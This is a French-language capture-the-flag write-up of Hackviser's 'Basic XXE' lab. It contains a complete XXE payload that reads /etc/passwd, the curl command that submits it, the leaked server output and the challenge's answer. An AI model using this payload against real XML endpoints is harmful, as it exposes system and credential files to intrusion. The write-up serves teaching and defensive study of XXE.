# Basic XXE - Hackviser CTF Writeup

## Introduction

Ce writeup détaille la résolution du défi "Basic XXE" de Hackviser, qui consistait à exploiter une vulnérabilité d'injection d'entité externe XML (XXE) pour accéder au contenu du fichier `/etc/passwd` sur le système. L'objectif final était de trouver le nom d'utilisateur du dernier utilisateur ajouté.

## Reconnaissance

La première étape a été d'accéder à l'application web via l'URL fournie : `https://deep-spoiler.europe1.hackviser.space`.
La page affichait un simple formulaire de contact avec les champs suivants : "First name", "Last name", "Email address" et "Message".

Pour comprendre comment le formulaire était soumis, j'ai récupéré le code source HTML de la page en utilisant `curl`:

```bash
curl https://deep-spoiler.europe1.hackviser.space
```

L'analyse du code source a révélé un script JavaScript (`submitForm()`) qui était responsable de la soumission du formulaire. Ce script construisait une requête `XMLHttpRequest` (AJAX) avec les informations suivantes :

-   **Méthode**: `POST`
-   **Endpoint**: `contact.php`
-   **Content-Type**: `application/xml`
-   **Données**: Un corps XML construit à partir des valeurs des champs du formulaire.

La structure XML attendue était la suivante :

```xml
<contact>
    <firstName>...</firstName>
    <lastName>...</lastName>
    <email>...</email>
    <message>...</message>
</contact>
```

## Identification de la vulnérabilité

La soumission du formulaire au format XML avec un `Content-Type: application/xml` est un indicateur fort d'une potentielle vulnérabilité XXE. Les parseurs XML côté serveur peuvent être configurés pour résoudre les entités externes, ce qui permet à un attaquant de lire des fichiers locaux, d'exécuter des commandes système (dans certains cas) ou d'effectuer des requêtes réseau arbitraires.

## Exploitation

L'objectif était de lire le fichier `/etc/passwd`. Pour ce faire, j'ai créé un payload XXE qui déclarait une entité externe `&xxe;` pointant vers `file:///etc/passwd` et l'ai insérée dans le champ `message` du formulaire XML.

Le payload XML complet que j'ai utilisé est le suivant :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<contact>
  <firstName>a</firstName>
  <lastName>b</lastName>
  <email>c@d.com</email>
  <message>&xxe;</message>
</contact>
```

J'ai sauvegardé ce payload dans un fichier nommé `xxe.xml`.

```bash
write_file(
    file_path="xxe.xml",
    content='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<contact>\n  <firstName>a</firstName>\n  <lastName>b</lastName>\n  <email>c@d.com</email>\n  <message>&xxe;</message>\n</contact>'
)
```

Ensuite, j'ai envoyé ce payload au serveur `contact.php` en utilisant `curl`, en spécifiant la méthode `POST` et le `Content-Type` correct :

```bash
curl -X POST -H "Content-Type: application/xml" --data @xxe.xml https://deep-spoiler.europe1.hackviser.space/contact.php
```

## Résultat

La réponse du serveur contenait le contenu du fichier `/etc/passwd` intégré dans le champ `<message>` du XML de réponse, prouvant l'exploitation réussie de la vulnérabilité XXE.

```xml
<?xml version="1.0" encoding="UTF-8"?>
        <contact>
            <firstName>a</firstName>
            <lastName>b</lastName>
            <email>c@d.com</email>
            <message>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ... (contenu omis pour la concision) ...
optimus:x:1001:1001:optimus,,,,my user:/home/optimus:/bin/bash
</message>
        </contact>
```

## Réponse au défi

En examinant le contenu de `/etc/passwd`, le dernier utilisateur ajouté était `optimus`.

## Conclusion

Ce défi a démontré une exploitation classique de la vulnérabilité XXE. En identifiant un endpoint qui accepte du XML et en injectant une entité externe, il a été possible de lire des fichiers sensibles sur le système, tels que `/etc/passwd`. Cela souligne l'importance de désactiver la résolution d'entités externes dans les parseurs XML pour prévenir ce type d'attaques.
